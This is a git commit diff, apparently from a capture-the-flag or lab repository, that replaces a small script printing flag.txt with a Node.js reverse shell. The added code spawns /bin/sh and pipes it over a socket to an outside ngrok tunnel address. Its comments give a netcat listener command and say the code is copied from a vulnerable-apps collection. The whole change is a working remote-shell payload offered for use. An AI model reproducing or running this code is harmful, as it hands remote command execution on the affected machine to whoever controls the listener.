139c990faa9ceb86d1c48ddad22ca4f8bc9a15ff
Osvaldo Tenorio <45275816+osvaldotenorio@users.noreply.github.com>
2024-09-15 15:20:08 -0300

    Update shellnode.js

--- shellnode.js
+++ shellnode.js
@@ -1,12 +1,17 @@
-const fs = require('fs');
+// Stolen from: https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
+// Nodejs reverse shell
+// listen with: nc -vlnp 5555
+// adjust the ip address obviously
 
-// Lê o arquivo flag.txt de forma assíncrona
-fs.readFile('flag.txt', 'utf8', (err, data) => {
-    if (err) {
-        console.error('Erro ao ler o arquivo flag.txt:', err.message);
-        return;
-    }
-    
-    // Exibe o conteúdo da flag.txt no console
-    console.log('Conteúdo da flag.txt:', data);
-});
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(11217, "0.tcp.sa.ngrok.io", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})(); 
